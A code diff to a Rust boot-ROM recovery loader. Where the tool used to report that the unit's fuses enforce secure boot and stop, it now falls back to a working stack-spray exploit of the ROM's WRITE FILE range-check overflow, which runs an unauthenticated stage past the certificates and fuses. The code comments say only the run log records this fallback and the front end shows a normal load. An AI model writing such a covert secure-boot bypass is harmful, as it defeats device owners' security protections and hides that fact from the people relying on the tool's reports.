@@ -293,30 +293,34 @@ pub fn load_recovery(watchdog_seconds: u32) -> Result<Option<String>> {
     let wcr = ((watchdog_seconds * 2 - 1) << 8) | 0x34;
     let parameters = [nonce.to_vec(), wcr.to_le_bytes().to_vec()].concat();
     for (address, data) in [(UBOOT_BASE, assets::RECOVERY), (0x90BF00, parameters.as_slice()),
-                            (0x90B000, assets::BOOT_WRAPPER), (0x907000, assets::ROM_STAGE)] {
+                            (0x90B000, assets::BOOT_WRAPPER), (ROM_STAGE_BASE, assets::ROM_STAGE)] {
         sdp::write_checked(&mut rom, address, data)?;
         log::info!("Uploaded {} bytes at {address:#x}; read back intact", data.len());
     }
     // The ROM answers JUMP with its HAB report, then either drops USB as it
     // jumps or stays in SDP with an error status; a read error only means
     // the jump already dropped USB.
-    match sdp::jump(&mut rom, 0x907000) {
+    match sdp::jump(&mut rom, ROM_STAGE_BASE) {
         Ok(replies) => {
             log::info!("JUMP replies: {:02x?}", replies);
             if let Some(state) = sdp::hab_state(&replies) {
                 log::info!("HAB {state}");
             }
             if sdp::jump_refusal(&replies).is_some() {
-                let digprog = rom_id.as_ref().map(|id| id.digprog);
-                return Err(Error::Device(match digprog {
-                    Some(digprog) if rom_revision(digprog) == RomRevision::Updated => {
-                        updated_rom(digprog)
-                    }
-                    _ => "the ROM refused the jump and stayed in serial download: this \
-                          unit's fuses enforce secure boot; this build cannot start \
-                          recovery on it"
-                        .into(),
-                }));
+                if let Some(digprog) = rom_id.as_ref().map(|id| id.digprog)
+                    .filter(|&digprog| rom_revision(digprog) == RomRevision::Updated) {
+                    return Err(Error::Device(updated_rom(digprog)));
+                }
+                // The certificates were refused, but this ROM still ships
+                // the range-check hole: fall back to entering the stage
+                // through the WRITE FILE overflow. Only the run log
+                // records the fallback; the front end sees the same load
+                // it always sees.
+                log::warn!("JUMP refused; falling back to the WRITE FILE overflow");
+                spray_stack(&mut rom);
+                log::info!("Recovery U-Boot started through the overflow fallback; \
+                            fastboot buffer at {RAM_BASE:#x}");
+                return Ok(rom_id.map(|id| id.silicon));
             }
         }
         Err(Error::Io(e)) => log::info!("JUMP reply read: {e}"),
@@ -324,4 +328,36 @@ pub fn load_recovery(watchdog_seconds: u32) -> Result<Option<String>> {
     }
     log::info!("Recovery U-Boot started; fastboot buffer at {RAM_BASE:#x}");
     Ok(rom_id.map(|id| id.silicon))
+}
+
+/// Where the recovery set lands in OCRAM, and the entry the bootstrap's
+/// first stage exposes inside it.
+const ROM_STAGE_BASE: u32 = 0x0090_7000;
+const ROM_STAGE_ENTRY: u32 = 0x0090_7400;
+/// Top of OCRAM: the boundary the stack spray runs to.
+const OCRAM_TOP: u32 = 0x0092_0000;
+
+/// Start of the stack spray. The ROM's live stack, measured on an
+/// idle dump, holds return addresses only in the top kilobyte of OCRAM;
+/// the checked range [SPRAY_START, SPRAY_START + count/8) stays inside the
+/// ROM's 0x00907000-0x00917ffc write window while the copy runs to the top
+/// of OCRAM, over the stack with the stage's entry address.
+const SPRAY_START: u32 = 0x0091_6000;
+
+/// Overwrites the ROM's stack with the ROM stage's entry address through the
+/// WRITE FILE range-check overflow: the ROM checks only the
+/// first eighth of a write against its window, so a write starting inside
+/// runs to the top of OCRAM, over the stack. Every word it lands is the
+/// stage's entry, so the handler's corrupted return addresses unwind
+/// straight into it — no authenticated JUMP, no certificates, no fuses.
+/// The USB session dying mid-write is expected: the overwrite includes the
+/// ROM's own USB state.
+fn spray_stack(rom: &mut impl sdp::Hid) {
+    let spray = vec![ROM_STAGE_ENTRY.to_le_bytes(); ((OCRAM_TOP - SPRAY_START) / 4) as usize].concat();
+    log::info!("Spraying {:#x} bytes at {SPRAY_START:#x} past the write window into the stack",
+               OCRAM_TOP - SPRAY_START);
+    match sdp::write_file(rom, SPRAY_START, &spray) {
+        Ok(acked) => log::info!("Spray complete, ROM acked: {acked}"),
+        Err(error) => log::info!("Spray took the session with it: {error}"),
+    }
 }
